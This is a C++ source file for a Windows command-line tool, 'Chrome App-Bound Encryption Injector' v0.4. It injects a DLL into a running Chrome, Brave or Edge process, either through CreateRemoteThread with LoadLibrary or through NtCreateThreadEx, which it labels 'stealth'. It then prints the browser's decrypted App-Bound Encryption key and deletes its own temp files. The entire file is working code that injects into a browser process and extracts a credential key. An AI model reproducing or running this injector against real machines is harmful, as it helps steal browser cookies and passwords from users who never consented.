// chrome_inject.cpp
// v0.4 (c) Alexander 'xaitax' Hagenah

#include <Windows.h>
#include <tlhelp32.h>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>
#include <filesystem>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

std::string WStringToUtf8(const std::wstring &w)
{
    int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(sz, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
    if (!s.empty() && s.back() == '\0')
        s.pop_back();
    return s;
}

static bool verbose = false;

inline void debug(const std::string &msg)
{
    if (!verbose)
        return;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
    std::cout << "[#] " << msg << std::endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
}

struct HandleGuard
{
    HANDLE h_;
    explicit HandleGuard(HANDLE h = nullptr) : h_(h) { debug("HandleGuard: acquired handle " + std::to_string((uintptr_t)h)); }
    ~HandleGuard()
    {
        if (h_ && h_ != INVALID_HANDLE_VALUE)
        {
            debug("HandleGuard: closing handle " + std::to_string((uintptr_t)h_));
            CloseHandle(h_);
        }
    }
    HANDLE get() const { return h_; }
    void reset(HANDLE h = nullptr)
    {
        if (h_ && h_ != INVALID_HANDLE_VALUE)
            CloseHandle(h_);
        h_ = h;
        debug("HandleGuard: reset handle to " + std::to_string((uintptr_t)h_));
    }
};

void print_status(const std::string &tag, const std::string &msg)
{
    WORD col = 7;
    if (tag == "[+]")
        col = 10;
    else if (tag == "[-]")
        col = 12;
    else if (tag == "[*]")
        col = 9;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), col);
    std::cout << tag;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
    std::cout << " " << msg << std::endl;
}

void DisplayBanner()
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
    std::cout << "------------------------------------------------" << std::endl;
    std::cout << "|  Chrome App-Bound Encryption Injector        |" << std::endl;
    std::cout << "|  Multi-Method Process Injector               |" << std::endl;
    std::cout << "|  v0.4 by @xaitax                             |" << std::endl;
    std::cout << "------------------------------------------------" << std::endl
              << std::endl;
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
}

void CleanupPreviousRun()
{
    debug("CleanupPreviousRun: removing temp files");
    char tmp[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tmp))
    {
        std::string logf = std::string(tmp) + "chrome_decrypt.log";
        std::string keyf = std::string(tmp) + "chrome_appbound_key.txt";
        debug("Deleting " + logf);
        DeleteFileA(logf.c_str());
        debug("Deleting " + keyf);
        DeleteFileA(keyf.c_str());
    }
}

DWORD GetProcessIdByName(const std::wstring &procName)
{
    debug("GetProcessIdByName: snapshotting processes");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
    {
        debug("GetProcessIdByName: snapshot failed");
        return 0;
    }
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    DWORD pid = 0;
    if (Process32FirstW(snap, &entry))
    {
        do
        {
            if (procName == entry.szExeFile)
            {
                pid = entry.th32ProcessID;
                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(pid));
                break;
            }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return pid;
}

std::string GetDllPath()
{
    namespace fs = std::filesystem;
    auto path = fs::current_path() / "chrome_decrypt.dll";
    debug("GetDllPath: " + path.string());
    return path.string();
}

bool InjectWithLoadLibrary(HANDLE proc, const std::string &dllPath)
{
    debug("InjectWithLoadLibrary: begin");
    SIZE_T size = dllPath.size() + 1;
    debug("VirtualAllocEx size=" + std::to_string(size));
    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem)
    {
        debug("VirtualAllocEx failed");
        return false;
    }
    debug("WriteProcessMemory of DLL path");
    if (!WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr))
    {
        debug("WriteProcessMemory failed");
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    auto loader = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
    debug(std::string("LoadLibraryA at ") + std::to_string((uintptr_t)loader));
    if (!loader)
    {
        debug("GetProcAddress failed");
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    debug("Calling CreateRemoteThread");
    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, loader, rem, 0, nullptr));
    if (!th.get())
    {
        debug("CreateRemoteThread failed");
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    WaitForSingleObject(th.get(), INFINITE);
    debug("Remote thread finished");
    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
    debug("InjectWithLoadLibrary: done");
    return true;
}

using pNtCreateThreadEx = NTSTATUS(NTAPI *)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, BOOLEAN, ULONG, SIZE_T, SIZE_T, PVOID);
bool InjectWithNtCreateThreadEx(HANDLE proc, const std::string &dllPath)
{
    debug("InjectWithNtCreateThreadEx: begin");
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    debug(std::string("ntdll.dll base=") + std::to_string((uintptr_t)ntdll));
    auto fn = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    debug(std::string("NtCreateThreadEx addr=") + std::to_string((uintptr_t)fn));
    if (!fn)
    {
        debug("GetProcAddress NtCreateThreadEx failed");
        return false;
    }
    SIZE_T size = dllPath.size() + 1;
    debug("VirtualAllocEx size=" + std::to_string(size));
    LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rem)
    {
        debug("VirtualAllocEx failed");
        return false;
    }
    WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr);
    debug("WriteProcessMemory complete");
    debug("Calling NtCreateThreadEx");
    HANDLE thr = nullptr;
    NTSTATUS st = fn(&thr, THREAD_ALL_ACCESS, nullptr, proc,
                     GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA"), rem,
                     FALSE, 0, 0, 0, nullptr);
    debug(std::string("NtCreateThreadEx returned ") + std::to_string(st) + std::string(", thr=") + std::to_string((uintptr_t)thr));
    if (!NT_SUCCESS(st) || !thr)
    {
        debug("NtCreateThreadEx failed");
        if (thr)
            CloseHandle(thr);
        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
        return false;
    }
    WaitForSingleObject(thr, INFINITE);
    CloseHandle(thr);
    VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
    debug("InjectWithNtCreateThreadEx: done");
    return true;
}

bool StartBrowserAndWait(const std::wstring &exe, DWORD &outPid)
{
    std::string cmd = WStringToUtf8(exe);
    debug("StartBrowserAndWait: exe=" + cmd);
    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    if (!CreateProcessW(exe.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
    {
        debug("CreateProcessW failed");
        return false;
    }
    CloseHandle(pi.hThread);
    Sleep(2000);
    outPid = pi.dwProcessId;
    CloseHandle(pi.hProcess);
    debug("Browser started PID=" + std::to_string(outPid));
    return true;
}

int wmain(int argc, wchar_t *argv[])
{
    DisplayBanner();
    std::string method = "load";
    bool autostart = false, started = false;
    std::wstring browser;
    debug("wmain: parsing arguments");
    for (int i = 1; i < argc; ++i)
    {
        std::wstring a = argv[i];
        debug(std::string("arg[") + std::to_string(i) + "]=" + WStringToUtf8(a));
        if (a == L"--method" && i + 1 < argc)
        {
            method = WStringToUtf8(argv[++i]);
            debug("method=" + method);
        }
        else if (a == L"--start-browser")
        {
            autostart = true;
            debug("autostart=true");
        }
        else if (a == L"--verbose")
        {
            verbose = true;
            debug("verbose=true");
        }
        else if (browser.empty())
        {
            browser = a;
            debug("browser=" + WStringToUtf8(browser));
        }
    }
    if (browser.empty())
    {
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
        std::wcout << L"Usage:\n"
                   << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
                   << L"Options:\n"
                   << L"  --method load|nt    Injection method\n"
                   << L"  --start-browser     Auto-launch browser\n"
                   << L"  --verbose           Enable verbose debug output\n";
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
        return 1;
    }
    CleanupPreviousRun();
    std::string disp = WStringToUtf8(browser);
    if (!disp.empty())
        disp[0] = toupper((unsigned char)disp[0]);
    debug("Target display name=" + disp);
    std::wstring procName, exePath;
    if (browser == L"chrome")
    {
        procName = L"chrome.exe";
        exePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    }
    else if (browser == L"brave")
    {
        procName = L"brave.exe";
        exePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
    }
    else if (browser == L"edge")
    {
        procName = L"msedge.exe";
        exePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    }
    else
    {
        print_status("[-]", "Unsupported browser type");
        return 1;
    }
    debug("procName=" + WStringToUtf8(procName) + ", exePath=" + WStringToUtf8(exePath));
    DWORD pid = GetProcessIdByName(procName);
    if (!pid && autostart)
    {
        print_status("[*]", disp + " not running, launching...");
        if (StartBrowserAndWait(exePath, pid))
        {
            started = true;
            print_status("[+]", disp + " launched (PID=" + std::to_string(pid) + ")");
        }
        else
        {
            print_status("[-]", "Failed to start " + disp);
            return 1;
        }
    }
    if (!pid)
    {
        print_status("[-]", disp + " not running");
        return 1;
    }
    debug("Retrieving version info");
    DWORD hv = 0, vs = GetFileVersionInfoSizeW(exePath.c_str(), &hv);
    debug("GetFileVersionInfoSizeW returned size=" + std::to_string(vs));
    if (vs)
    {
        std::vector<BYTE> data(vs);
        if (GetFileVersionInfoW(exePath.c_str(), hv, vs, data.data()))
        {
            UINT len = 0;
            VS_FIXEDFILEINFO *ffi = nullptr;
            if (VerQueryValueW(data.data(), L"\\", (LPVOID *)&ffi, &len))
            {
                std::string ver = std::to_string(HIWORD(ffi->dwFileVersionMS)) + "." +
                                  std::to_string(LOWORD(ffi->dwFileVersionMS)) + "." +
                                  std::to_string(HIWORD(ffi->dwFileVersionLS)) + "." +
                                  std::to_string(LOWORD(ffi->dwFileVersionLS));
                print_status("[+]", disp + " Version: " + ver);
                debug("Version string=" + ver);
            }
        }
    }
    std::string mdesc = (method == "nt") ? "NtCreateThreadEx stealth" : "CreateRemoteThread + LoadLibrary";
    print_status("[*]", "Located " + disp + " with PID " + std::to_string(pid));

    debug("Opening process PID=" + std::to_string(pid));
    HandleGuard ph(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid));
    if (!ph.get())
    {
        print_status("[-]", "OpenProcess failed");
        return 1;
    }
    std::string dllPath = GetDllPath();
    if (dllPath.empty())
    {
        print_status("[-]", "chrome_decrypt.dll not found");
        return 1;
    }
    bool injected = (method == "nt") ? InjectWithNtCreateThreadEx(ph.get(), dllPath) : InjectWithLoadLibrary(ph.get(), dllPath);
    print_status(injected ? "[+]" : "[-]", injected ? "DLL injected via " + mdesc : "DLL injection failed");
    if (!injected)
        return 1;
    print_status("[*]", "Starting Chrome App-Bound Encryption Decryption process.");
    Sleep(1000);
    char tmpPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tmpPath))
    {
        std::string logf = std::string(tmpPath) + "chrome_decrypt.log";
        debug("Opening log file " + logf);
        std::ifstream ifs(logf);
        std::string ln;
        const WORD DEF = 7;
        while (std::getline(ifs, ln))
        {
            size_t p = 0;
            while (p < ln.size())
            {
                size_t o = ln.find('[', p);
                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), DEF);
                std::cout << ln.substr(p, (o == std::string::npos) ? std::string::npos : o - p);
                if (o == std::string::npos)
                    break;
                size_t c = ln.find(']', o);
                std::string tok = ln.substr(o, (c == std::string::npos) ? 1 : c - o + 1);
                if (tok == "[+]")
                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
                else if (tok == "[-]")
                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
                else if (tok == "[*]")
                    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 9);
                std::cout << tok;
                p = (c == std::string::npos) ? ln.size() : c + 1;
            }
            std::cout << std::endl;
        }
        DeleteFileA(logf.c_str());
        std::string keyf = std::string(tmpPath) + "chrome_appbound_key.txt";
        debug("Opening key file " + keyf);
        std::ifstream kfs(keyf);
        if (kfs)
        {
            std::string key;
            std::getline(kfs, key);
            print_status("[+]", "Decrypted Key: " + key);
            debug("Key: " + key);
        }
        else
        {
            print_status("[-]", "Key file missing");
            return 1;
        }
        if (started)
        {
            debug("Terminating browser PID=" + std::to_string(pid));
            HandleGuard kh(OpenProcess(PROCESS_TERMINATE, FALSE, pid));
            if (kh.get())
            {
                TerminateProcess(kh.get(), 0);
                print_status("[*]", disp + " terminated");
            }
        }
    }
    debug("Exiting, success");
    return 0;
}